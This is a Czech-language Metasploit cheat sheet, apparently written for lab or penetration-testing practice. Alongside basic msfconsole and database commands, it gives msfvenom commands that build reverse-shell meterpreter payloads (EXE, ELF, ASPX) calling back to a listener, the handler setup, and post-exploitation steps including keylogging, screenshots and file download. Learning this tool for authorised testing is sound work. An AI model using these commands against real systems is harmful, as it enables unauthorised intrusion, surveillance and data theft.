# 🚀 Metasploit Cheat Sheet

## 📌 Základní práce v msfconsole

### Spuštění

```bash
msfconsole
```

Tichý režim:

```bash
msfconsole -q
```

---

### Vyhledávání modulů

```bash
search smb
```

```bash
search type:exploit apache
```

```bash
search cve:2021
```

---

### Výběr modulu

```bash
use exploit/windows/smb/example
```

nebo

```bash
use 0
```

(podle indexu výsledků vyhledávání)

---

### Zobrazení informací

```bash
info
```

Zobrazí:

- popis modulu
    
- autora
    
- reference
    
- CVE
    
- rank (spolehlivost)
    

---

### Konfigurace modulu

```bash
show options
```

```bash
show advanced
```

```bash
show payloads
```

```bash
show targets
```

---

### Nastavení parametrů

```bash
set RHOSTS 10.10.10.5
```

```bash
set LHOST tun0
```

```bash
set LPORT 4444
```

---

### Spuštění

```bash
run
```

nebo

```bash
exploit
```

---

### Ověření zranitelnosti

Pokud modul podporuje:

```bash
check
```

---

### Návrat do hlavního menu

```bash
back
```

---

# 🗄️ Databáze (PostgreSQL)

Metasploit ukládá nalezené hosty, služby a výsledky skenování.

---

### Stav databáze

```bash
db_status
```

---

### Vytvoření workspace

```bash
workspace -a FirmaA
```

---

### Přepnutí workspace

```bash
workspace FirmaA
```

---

### Seznam workspace

```bash
workspace
```

---

### Nmap přímo z MSF

```bash
db_nmap -sV 10.10.10.5
```

---

### Nalezení hosté

```bash
hosts
```

---

### Nalezené služby

```bash
services
```

---

### Přihlašovací údaje

```bash
creds
```

---

### Poznámky

```bash
notes
```

---

# 🎯 Payloady

### Zobrazení dostupných payloadů

```bash
show payloads
```

---

### Nastavení payloadu

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

---

### Nastavení listeneru

```bash
set LHOST tun0
```

```bash
set LPORT 4444
```

---

# 🧰 MSFVenom

Generování payloadů:

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format>
```

---

### Windows EXE

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=10.10.14.5 \
LPORT=4444 \
-f exe \
-o shell.exe
```

---

### Linux ELF

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
LHOST=10.10.14.5 \
LPORT=4444 \
-f elf \
-o shell.elf
```

---

### ASPX

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=10.10.14.5 \
LPORT=4444 \
-f aspx \
-o shell.aspx
```

---

# 🎧 Multi Handler

Příjem spojení od payloadu:

```bash
use exploit/multi/handler
```

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

```bash
set LHOST tun0
```

```bash
set LPORT 4444
```

```bash
run
```

---

# 📡 Sessions

### Výpis session

```bash
sessions
```

---

### Připojení k session

```bash
sessions -i 1
```

---

### Zavření session

```bash
sessions -k 1
```

---

### Odsunutí session

V Meterpreteru:

```bash
background
```

---

# 🐚 Meterpreter

## Informace o systému

### Identita

```bash
getuid
```

### Informace o OS

```bash
sysinfo
```

### IP konfigurace

```bash
ipconfig
```

### Aktuální proces

```bash
getpid
```

---

## Souborový systém

### Aktuální adresář

```bash
pwd
```

### Změna adresáře

```bash
cd
```

### Výpis souborů

```bash
ls
```

### Upload souboru

```bash
upload local.txt
```

### Download souboru

```bash
download secret.txt
```

---

## Shell

Přechod do CMD/Bash:

```bash
shell
```

---

## Procesy

Výpis procesů:

```bash
ps
```

Migrace do procesu:

```bash
migrate <PID>
```

---

## Screenshot

```bash
screenshot
```

---

## Keyscan

Spuštění:

```bash
keyscan_start
```

Zobrazení:

```bash
keyscan_dump
```

Zastavení:

```bash
keyscan_stop
```

---

# ⚙️ Jobs

Výpis běžících úloh:

```bash
jobs
```

---

Zastavení:

```bash
jobs -k <ID>
```

---

# 📄 Resource Skripty

Automatizace příkazů.

Spuštění:

```bash
resource setup.rc
```

Ukázka:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

---

# 🔍 Užitečné Pomocné Příkazy

Historie:

```bash
history
```

---

Pomoc:

```bash
help
```

---

Verze:

```bash
version
```

---

Editor modulu:

```bash
edit
```

---

# 📌 Typický Metasploit Workflow

```text
1. Workspace
        |
        ↓
2. db_nmap
        |
        ↓
3. hosts / services
        |
        ↓
4. search
        |
        ↓
5. use
        |
        ↓
6. set options
        |
        ↓
7. check
        |
        ↓
8. exploit
        |
        ↓
9. session
        |
        ↓
10. post modules
```